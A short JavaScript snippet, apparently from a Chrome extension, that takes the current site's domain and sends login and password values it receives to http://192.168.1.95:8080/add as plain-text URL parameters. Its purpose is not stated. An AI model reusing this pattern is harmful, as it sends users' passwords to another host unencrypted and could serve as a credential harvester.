var x = (window.location.hostname.toString());
chrome.runtime.sendMessage({domain:x});

chrome.runtime.onMessage.addListener( (request, sender, sendResponse) => {
    fetch(`http://192.168.1.95:8080/add?login=${request.login}&password=${request.password}&domain=${x}`)
            .then(r => r.text())
            .then(result => console.log(result));
  });